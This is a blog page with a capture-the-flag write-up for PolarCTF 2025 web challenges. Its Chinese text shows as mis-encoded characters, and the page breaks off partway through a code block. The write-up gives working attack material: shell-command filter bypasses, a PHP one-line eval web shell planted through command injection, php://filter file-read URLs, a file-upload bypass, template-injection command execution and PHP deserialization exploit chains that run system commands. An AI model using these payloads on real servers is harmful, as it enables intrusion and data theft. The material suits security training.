<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="VENI,VEDI,VICI">
<meta property="og:type" content="website">
<meta property="og:title" content="Sauy&#39;s corner">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Sauy&#39;s corner">
<meta property="og:description" content="VENI,VEDI,VICI">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Sauy">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>Sauy's corner</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Sauy's corner</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>å…³äº</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/06/29/2025%E5%B9%B4%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9BPolarCTF-WEB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/2.png">
      <meta itemprop="name" content="Sauy">
      <meta itemprop="description" content="VENI,VEDI,VICI">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sauy's corner">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/06/29/2025%E5%B9%B4%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9BPolarCTF-WEB/" class="post-title-link" itemprop="url">2025å¹´å¤å­£ä¸ªäººæŒ‘æˆ˜èµ›PolarCTF-WEB</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2025-06-29 17:24:58 / ä¿®æ”¹æ—¶é—´ï¼š17:31:31" itemprop="dateCreated datePublished" datetime="2025-06-29T17:24:58+08:00">2025-06-29</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="ez-check"><a href="#ez-check" class="headerlink" title="ez_check"></a>ez_check</h2><p>javaé¢˜æš‚æ—¶ä¸ä¼š</p>
<h2 id="ç‹—é»‘å­çš„å˜é‡"><a href="#ç‹—é»‘å­çš„å˜é‡" class="headerlink" title="ç‹—é»‘å­çš„å˜é‡"></a>ç‹—é»‘å­çš„å˜é‡</h2><p>è€ƒç‚¹:æˆªå–å’Œæ‹¼æ¥$PATHä¸­çš„å­—ç¬¦æ„é€ å‘½ä»¤</p>
<p>æ„é€ æ–¹æ³•:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">$PATJl/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br></pre></td></tr></table></figure>

<p>æ„é€ lsè¿™ä¸ªå‘½ä»¤çš„ç»“æœ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PATH:5:1&#125; //l</span><br><span class="line">$&#123;PATH:2:1&#125; //s</span><br><span class="line">$&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125; //ls</span><br><span class="line">//ç¬¬ä¸€ä¸ªå­—æ¯ä»£è¡¨PATHé‡Œçš„ç¬¬å‡ ä¸ªå­—ç¬¦ï¼Œä»0å¼€å§‹ï¼Œå’Œæ•°ç»„ä¸€æ · ç¬¬äºŒä¸ªæ˜¯ä»£è¡¨æˆªå–å‡ ä¸ªå­—ç¬¦</span><br></pre></td></tr></table></figure>

<p>dirsearchæ‰«æ æ‰«å‡ºadmin.php å¯ä»¥çœ‹åˆ°PATHçš„å†…å®¹</p>
<p><img src="/images/image-20250628211338078.png" alt="image-20250628211338078"></p>
<p>äºæ˜¯ä¹å°±å¼€å§‹æ‹¼æ¥è¦è¢«æ›¿æ¢çš„å­—æ¯</p>
<p><code>$&#123;PATH:8;1&#125;at /*  </code> cat &#x2F;*</p>
<h2 id="ç‹—é»‘å­çš„éšè—"><a href="#ç‹—é»‘å­çš„éšè—" class="headerlink" title="ç‹—é»‘å­çš„éšè—"></a>ç‹—é»‘å­çš„éšè—</h2><p>è¿›å»åªæœ‰ä¸€ä¸ªåˆ·æ–°æŒ‰é’® dirsearchä¹Ÿæ²¡æœ‰çœ‹å‡ºä¸œè¥¿ F12ä¹ æƒ¯ çœ‹åˆ°cmdå‚æ•° æ‰§è¡Œå‘½ä»¤ æˆåŠŸ</p>
<p>ç¦äº†&#x2F; envçœ‹çœ‹ ç›´æ¥å‡ºå‡flagï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼<img src="/images/image-20250628212358616.png" alt="image-20250628212358616"></p>
<p>ctrl+uå¾—åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> <span class="number">1</span>	<span class="meta">&lt;?php</span></span><br><span class="line"> <span class="number">2</span>	<span class="comment">// æ£€æŸ¥æ˜¯å¦æœ‰POSTè¯·æ±‚ä¸”åŒ…å«cmdå‚æ•°</span></span><br><span class="line"> <span class="number">3</span>	<span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line"> <span class="number">4</span>	    <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"> <span class="number">5</span>	    </span><br><span class="line"> <span class="number">6</span>	    <span class="comment">// å¼ºåˆ¶åˆ‡æ¢åˆ°å½“å‰ç›®å½•ï¼ˆé‡è¦å®‰å…¨æªæ–½ï¼‰</span></span><br><span class="line"> <span class="number">7</span>	    <span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line"> <span class="number">8</span>	    </span><br><span class="line"> <span class="number">9</span>	    <span class="comment">// è¿‡æ»¤å±é™©å­—ç¬¦å’Œå…³é”®å­—</span></span><br><span class="line"><span class="number">10</span>	    <span class="variable">$blacklist</span> = <span class="keyword">array</span>(<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;in&#x27;</span>,<span class="string">&#x27;nd&#x27;</span>,<span class="string">&#x27;de&#x27;</span>,<span class="string">&#x27;ex&#x27;</span>,<span class="string">&#x27;head&#x27;</span>,<span class="string">&#x27;tac&#x27;</span>,<span class="string">&#x27;le&#x27;</span>,<span class="string">&#x27;ss&#x27;</span>,<span class="string">&#x27;mo&#x27;</span>,<span class="string">&#x27;re&#x27;</span>,<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line"><span class="number">11</span>	    <span class="variable">$is_dangerous</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="number">12</span>	    </span><br><span class="line"><span class="number">13</span>	    <span class="comment">// æ£€æŸ¥å‘½ä»¤æ˜¯å¦åŒ…å«é»‘åå•ä¸­çš„ä»»ä½•é¡¹</span></span><br><span class="line"><span class="number">14</span>	    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line"><span class="number">15</span>	        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$cmd</span>, <span class="variable">$item</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line"><span class="number">16</span>	            <span class="variable">$is_dangerous</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="number">17</span>	            <span class="keyword">break</span>;</span><br><span class="line"><span class="number">18</span>	        &#125;</span><br><span class="line"><span class="number">19</span>	    &#125;</span><br><span class="line"><span class="number">20</span>	    </span><br><span class="line"><span class="number">21</span>	    <span class="comment">// å¦‚æœæ£€æµ‹åˆ°å±é™©æ“ä½œï¼Œå›æ˜¾é”™è¯¯ä¿¡æ¯</span></span><br><span class="line"><span class="number">22</span>	    <span class="keyword">if</span> (<span class="variable">$is_dangerous</span>) &#123;</span><br><span class="line"><span class="number">23</span>	        <span class="keyword">echo</span> <span class="string">&quot;ä¸æ”¯æŒå±é™©æ“ä½œ&quot;</span>;</span><br><span class="line"><span class="number">24</span>	    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">25</span>	        <span class="comment">// æ£€æŸ¥è¿‡æ»¤åçš„å‘½ä»¤æ˜¯å¦ä¸ºç©º</span></span><br><span class="line"><span class="number">26</span>	        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$cmd</span>)) &#123;</span><br><span class="line"><span class="number">27</span>	            <span class="comment">// æ‰§è¡Œè¿‡æ»¤åçš„å‘½ä»¤</span></span><br><span class="line"><span class="number">28</span>	            <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="number">29</span>	        &#125;</span><br><span class="line"><span class="number">30</span>	    &#125;</span><br><span class="line"><span class="number">31</span>	&#125;</span><br><span class="line"><span class="number">32</span>	?</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å†™æœ¨é©¬å§ <code>cmd=echo &#39;&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;&#39; &gt; a.php</code></p>
<p>antswordè¿æ¥æˆåŠŸ æ‰§è¡Œå‘½ä»¤å³å¯</p>
<p><img src="/images/image-20250628213921480.png" alt="image-20250628213921480"></p>
<h2 id="ç®€å•çš„é“¾å­"><a href="#ç®€å•çš„é“¾å­" class="headerlink" title="ç®€å•çš„é“¾å­"></a>ç®€å•çš„é“¾å­</h2><p>å¥½ç®€å•çš„èœé¸Ÿååºåˆ—åŒ–</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A &#123;</span><br><span class="line">    public $cmd = &#x27;cat /flag&#x27;;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if (isset($this-&gt;cmd)) &#123;</span><br><span class="line">            system($this-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new A();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="æ¸—é€ä¹‹ç‹"><a href="#æ¸—é€ä¹‹ç‹" class="headerlink" title="æ¸—é€ä¹‹ç‹"></a>æ¸—é€ä¹‹ç‹</h2><p>é¦–å…ˆè¿›å»æ˜¯ç™»å½•ç•Œé¢ å¸å·admin éšä¾¿çŒœäº†ä¸€ä¸ªå¼±å£ä»¤ æç¤ºå¯†ç é”™è¯¯ è‡ªå·±æ‹¿å­—å…¸å»çˆ†ä¹Ÿæ²¡çˆ†å‡ºæ¥</p>
<p>äºæ˜¯dirsearchæ‰«äº†ä¸€ä¸‹ç›®å½• å¾—åˆ°æœ‰ç”¨çš„ä¸¤ä¸ªè·¯å¾„</p>
<p><img src="/images/image-20250629103626404.png" alt="image-20250629103626404"></p>
<p>è®¿é—®admin.phpå¾—åˆ°base64åŠ å¯†çš„å¯†æ–‡ è§£å¯†åä¸ºpolarctf</p>
<p><a target="_blank" rel="noopener" href="http://www.zipæºç æ³„éœ²/">www.zipæºç æ³„éœ²</a> ä¸‹è½½ä¸‹æ¥å‘ç°éœ€è¦å¯†ç  äºæ˜¯è¾“å…¥polarctf æˆåŠŸè§£å¯† æ‰“å¼€å‘ç°æ˜¯ä¸ªå¼±å¯†ç å­—å…¸ äºæ˜¯æˆ‘ä»¬å°±ä½¿ç”¨ä»–çš„å­—å…¸ çˆ†å‡ºæ¥å¯†ç æ˜¯admin789 æˆåŠŸç™»å½• è¿›å…¥ç•Œé¢ç‚¹å‡»å‘ç°æç¤ºéæ³•çš„æ–‡ä»¶åŒ…å« é‚£å°±æ˜¯æ–‡ä»¶åŒ…å«</p>
<p><code>/polarctf/?page=php://filter/convert.base64-encode/resource=about.php</code></p>
<p><code>/polarctf/?page=php://filter/convert.base64-encode/resource=hint.php</code></p>
<p>æç¤ºæœ‰æ–‡ä»¶ä¸Šä¼ ç•Œé¢ ç°åœ¨å°±æ˜¯æ‰¾æ–‡ä»¶ä¸Šä¼ å…¥å£ è¿™é‡Œä½ å¯ä»¥dirsearchæ‰« æ‰«å‡ºæ¥æ–‡ä»¶ä¸Šä¼ è·¯å¾„</p>
<p><img src="/images/image-20250629104228184.png" alt="image-20250629104228184"></p>
<p><img src="/images/image-20250629104209263.png" alt="image-20250629104209263"></p>
<p>å¾ˆç®€å•çš„æ–‡ä»¶ä¸Šä¼  æ”¹ä¸€ä¸‹content-typeå³å¯</p>
<p><img src="/images/image-20250629104323974.png" alt="image-20250629104323974"></p>
<p>antswordè¿æ¥å³å¯</p>
<h2 id="çœŸå‡ECR"><a href="#çœŸå‡ECR" class="headerlink" title="çœŸå‡ECR"></a>çœŸå‡ECR</h2><p>éé¢„æœŸ:</p>
<p>è¿›å»å°±æ˜¯æºä»£ç  ç¦äº†ä¸€äº›æŒ‡ä»¤ ä½†æ˜¯ä½ å¯ä»¥ä½¿ç”¨è½¬ä¹‰ç»•è¿‡</p>
<p><code>?cmd=ca\t /fla\g</code></p>
<p>é¢„æœŸ:</p>
<p>å…ˆè®¿é—®flag.php</p>
<p>å¾—åˆ°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KeY=aGVpZ291emk= USERID=p8Sjk58 DATA=2JSklNA= å¦‚æœè¿™ä¹Ÿä¸æ˜ç™½çš„è¯ï¼ŒåŠ ä¸Šåç¼€è¯•ä¸€è¯•</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€ä¸ªè§£ç åå¾—åˆ°heigouzi å¸¦ä¸Šåç¼€phpå¯ä»¥è®¿é—®</p>
<p><img src="/images/image-20250629133659277.png" alt="image-20250629133659277"></p>
<p>å‚æ•°åº”è¯¥ä¹Ÿæ˜¯cmd æ‰§è¡Œå‘½ä»¤ls å‘ç°èƒ½å¤Ÿè¯»å–åˆ°è¿™ä¸ªç½‘ç«™çš„æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cainiao.txt</span><br><span class="line">flag.php</span><br><span class="line">heigouzi.php</span><br><span class="line">index.php</span><br><span class="line">she11.php</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹cainiao.txt</p>
<p>æ˜¯ä¸ªè§£å¯†å‡½æ•° ç”¨å°±å¥½</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æ•°æ®:</span><br><span class="line">KeY=aGVpZ291emk= USERID=p8Sjk58 DATA=2JSklNA=</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Decryption &#123; </span><br><span class="line">    public function decrypt($data, $key) &#123; </span><br><span class="line">        $char = &#x27;&#x27;; $str = &#x27;&#x27;;</span><br><span class="line">        $key = md5($key); $x = 0;</span><br><span class="line">        $data = base64_decode($data);</span><br><span class="line">        $len = strlen($data);</span><br><span class="line">        $l = strlen($key);</span><br><span class="line">        for ($i = 0; $i &lt; $len; $i++) &#123; </span><br><span class="line">            if ($x == $l) &#123; </span><br><span class="line">                $x = 0; </span><br><span class="line">            &#125; </span><br><span class="line">            $char.= substr($key, $x, 1);</span><br><span class="line">            $x++; &#125; </span><br><span class="line">        for ($i = 0; $i &lt; $len; $i++) &#123; </span><br><span class="line">            $str.= chr(ord($data[$i]) - ord($char[$i])); </span><br><span class="line">        &#125; return $str; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">$data = &#x27;2JSklNA=&#x27;;</span><br><span class="line">$key = &#x27;answer&#x27;; </span><br><span class="line">$decryption = new Decryption();</span><br><span class="line">$result = $decryption-&gt;decrypt($data, $key);</span><br><span class="line">echo $result;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>è§£å¯†å‡ºæ¥æ˜¯wanan æ˜¯she11.phpçš„å¯†ç  antswordè¿æ¥å³å¯</p>
<h2 id="nukaka-ser2"><a href="#nukaka-ser2" class="headerlink" title="nukaka_ser2"></a>nukaka_ser2</h2><p>æ²¡ä»€ä¹ˆå¥½è¯´çš„ ååºåˆ—åŒ–å®¡é“¾å­</p>
<p>çœ‹èµ·æ¥å¾ˆé•¿ å…¶å®ä¸€ä¸‹å°±åšå‡ºäº†</p>
<p>popé“¾å­å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FlagReader</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logfile</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DataValidator</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FakeDanger</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$buffer</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VulnerableClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logger</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$debugMode</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$A</span> = <span class="keyword">new</span> <span class="title class_">VulnerableClass</span>();</span><br><span class="line"><span class="variable">$A</span> -&gt; logger = <span class="keyword">new</span> <span class="title class_">FlagReader</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$A</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="ghost-render"><a href="#ghost-render" class="headerlink" title="ghost_render"></a>ghost_render</h2><p>è¯´æ˜¯mdæ¸²æŸ“ æŠ“åŒ…è‡ªå·±burpå°è¯• æ¸²æŸ“æˆ‘å°±æƒ³åˆ°ssti æµ‹äº†ä¸‹è¿˜çœŸæ˜¯</p>
<p><img src="/images/image-20250629143312586.png" alt="image-20250629143312586"></p>
<p>éå¸¸ç®€å•çš„ssti æ²¡æœ‰è¿‡æ»¤ ç›´æ¥æ‰§è¡Œå‘½ä»¤å³å¯ ä¸è¿‡flagè·¯å¾„å¾—é¦–å…ˆå»è¯»å–app.pyæ‰å¯ä»¥çŸ¥é“flagå­˜å‚¨åœ¨&#x2F;var&#x2F;secret_flagä¸‹</p>
<p><img src="/images/image-20250629143858180.png" alt="image-20250629143858180"></p>
<h2 id="rceå‘½ä»¤æ‰§è¡Œç³»ç»Ÿ"><a href="#rceå‘½ä»¤æ‰§è¡Œç³»ç»Ÿ" class="headerlink" title="rceå‘½ä»¤æ‰§è¡Œç³»ç»Ÿ"></a>rceå‘½ä»¤æ‰§è¡Œç³»ç»Ÿ</h2><p>lsè¢«è¿‡æ»¤ è¯•è¯•è½¬ä¹‰</p>
<p><img src="/images/image-20250629152942120.png" alt="image-20250629152942120"></p>
<p>è®¿é—®å‘f1ag.phpå¾—åˆ°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ—¢ç„¶ä½ æ‰¾åˆ°è¿™é‡Œäº†é‚£å°±å‘Šè¯‰ä½ ç‚¹ä¸œè¥¿å§ å¼‚æˆ–åå®ƒå¥½åƒæ”¹åå«XOR_KEYï¼Œç»™ä»–ä¼ ä¸ªå‚è¯•ä¸€è¯•å‘¢ï¼Œå¯¹äº†ï¼Œå’±ä»¬çš„é¶åœºå«ä»€ä¹ˆæ¥ç€ï¼ŸğŸ¤”</span><br></pre></td></tr></table></figure>

<p>payload env XOR_KEY&#x3D;Polar</p>
<h2 id="easyRead"><a href="#easyRead" class="headerlink" title="easyRead"></a>easyRead</h2><p>å—¯å¾ˆç®€å•çš„é“¾å­ ä½†æ˜¯æ‹¿flagå¾ˆç¥ç» flagæˆ‘æ‰§è¡Œå‘½ä»¤æ²¡æ‰¾åˆ° è¿™é“é¢˜flagæ˜¯flag{Hello&gt;&gt;&gt;Hello&gt;&gt;&gt;run}</p>
<p>exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class Read&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$is</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Help</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Polar</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span> = <span class="string">&quot;system(&#x27;ls /&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Doit</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$is</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$source</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Read</span>(); <span class="variable">$a1</span> = <span class="keyword">new</span> <span class="title class_">Read</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; source = <span class="variable">$a1</span>;</span><br><span class="line"><span class="variable">$a1</span> -&gt; is = <span class="keyword">new</span> <span class="title class_">Help</span>();</span><br><span class="line"><span class="variable">$a1</span> -&gt; is -&gt; str = <span class="keyword">new</span> <span class="title class_">Doit</span>();</span><br><span class="line"><span class="variable">$a1</span> -&gt; is -&gt; str -&gt; is = <span class="keyword">new</span> <span class="title class_">Polar</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span 